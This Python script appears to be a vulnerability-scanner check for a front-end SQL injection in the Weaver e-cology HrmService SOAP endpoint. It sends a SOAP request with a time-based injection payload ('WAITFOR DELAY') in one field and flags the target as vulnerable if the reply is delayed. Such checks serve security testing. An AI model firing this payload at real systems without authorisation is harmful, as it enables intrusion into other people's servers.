import requests
import urllib


def verify(url):
    relsult = {
        'name': '泛微e-cology接口HrmService前台SQL注入漏洞(Bool_sqli)',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.88 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Encoding': 'gzip, deflate, br',
        'Connection': 'close',
        'SOAPAction': 'urn:weaver.hrm.webservice.HrmService.getHrmDepartmentInfo',
        'Content-Type': 'text/xml;charset=UTF-8',
    }
    data = '''<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:hrm="http://localhost/services/HrmService">
       <soapenv:Header/>
       <soapenv:Body>
          <hrm:getHrmDepartmentInfo>
             <!--type: string-->
             <hrm:in0>gero et</hrm:in0>
             <!--type: string-->
             <hrm:in1>1)1;WAITFOR DELAY '0:0:5'--</hrm:in1>
          </hrm:getHrmDepartmentInfo>
       </soapenv:Body>
    </soapenv:Envelope>'''
    vurl = urllib.parse.urljoin(url, "services/HrmService")  # 使用延时判断注入点实际可以用bool进行注入
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code not in range(400, 499) and response.elapsed.total_seconds() > 5:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult
